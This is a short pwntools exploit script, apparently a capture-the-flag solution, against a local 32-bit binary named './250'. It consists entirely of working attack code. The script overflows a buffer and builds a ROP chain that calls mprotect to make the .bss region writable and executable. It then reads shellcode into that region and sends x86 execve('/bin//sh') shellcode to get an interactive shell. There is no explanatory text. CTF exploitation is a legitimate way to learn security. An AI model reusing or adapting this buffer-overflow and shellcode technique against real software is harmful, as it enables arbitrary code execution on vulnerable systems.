#!/usr/bin/env python
# coding=utf-8
from pwn import *
a=process("./250")
elf=ELF("./250")
#context.log_level='debug'
gdb.attach(a,"b *0x804896D")
a.recvuntil("ize]")
a.sendline("400")
a.recvuntil("Data]")
bss_addr=0x8049000
read_addr=elf.symbols["read"]
start_addr=0x8048736
mmap_addr=elf.symbols["mprotect"]
payload='A'*62
payload+=p32(mmap_addr)
payload+=p32(0x08062fbb)
payload+=p32(bss_addr)
payload+=p32(0x100)
payload+=p32(0x7)
payload+=p32(read_addr)
payload+=p32(bss_addr)#pop3_ret
payload+=p32(0)
payload+=p32(bss_addr)
payload+=p32(0x100)


a.sendline(payload)
pause()
a.recv()
shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"
a.sendline(shellcode_x86)
a.interactive()
